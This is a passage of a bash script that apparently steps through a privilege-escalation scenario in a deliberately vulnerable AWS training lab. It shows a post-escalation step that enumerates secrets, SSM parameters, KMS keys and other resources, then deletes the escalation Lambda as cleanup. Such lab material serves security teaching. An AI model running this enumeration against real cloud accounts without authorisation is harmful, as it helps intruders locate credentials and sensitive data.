try "List account aliases"  aws iam list-account-aliases --profile "$PROFILE"
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
printf "\n${BOLD}${GREEN}Now we have permissions we didn't have before\n${RESET}"
printf "\n"
read -r -p "Step 9 is completed. Press Enter to finish (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 9
#############################################
# Step 10. Cleanup, PrivEsc Lambda removal
#############################################
printf "%s%s%s\n\n" "${BOLD}${CYAN}" "===  10. Delete Lambda '${LAMBDA_NAME}'  ===" "${RESET}"
printf "Lambda deletion is optional for the attack but necessary since it will not be deleted by Terraform\n\n"

: "${LAMBDA_NAME:?Missing Lambda name (LAMBDA_NAME)}"
: "${REGION:?Missing AWS region (REGION)}"

if aws lambda get-function --profile "$PROFILE" --function-name "$LAMBDA_NAME" --region "$REGION" >/dev/null 2>&1; then
  if aws lambda delete-function --profile "$PROFILE" --function-name "$LAMBDA_NAME" --region "$REGION"; then
    ok "Deleted Lambda function: ${LAMBDA_NAME}"
  else
    err "Failed to delete Lambda function: ${LAMBDA_NAME}"
  fi
else
  info "Lambda function '${LAMBDA_NAME}' not found; nothing to delete."
fi
rm -rf /tmp/streamgoat_eic_*
#############################################
# End of Step 10
#############################################
printf "\n"
read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
